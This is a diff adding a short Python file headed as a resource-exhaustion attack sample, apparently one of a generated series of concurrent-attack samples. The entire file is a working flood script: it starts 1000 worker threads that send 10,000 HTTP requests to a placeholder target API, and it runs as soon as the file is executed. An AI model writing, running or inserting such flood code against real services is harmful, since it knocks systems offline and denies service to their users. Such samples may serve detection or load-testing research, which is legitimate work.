@@ -1,0 +1,18 @@
+# Resource Exhaustion - Concurrent Attack Sample 8
+# Created: 2026-03-30T22:24:11.730498
+# Type: Connection Flood / Thread Exhaustion / WebSocket Flood
+
+# Thread Pool Exhaustion - Sample 2
+from concurrent.futures import ThreadPoolExecutor
+import requests
+
+def exhaust_threads():
+    def make_request(i):
+        return requests.get("https://target.com/api")
+    
+    with ThreadPoolExecutor(max_workers=1000) as executor:
+        futures = [executor.submit(make_request, i) for i in range(10000)]
+        for future in futures:
+            future.result()
+
+exhaust_threads()
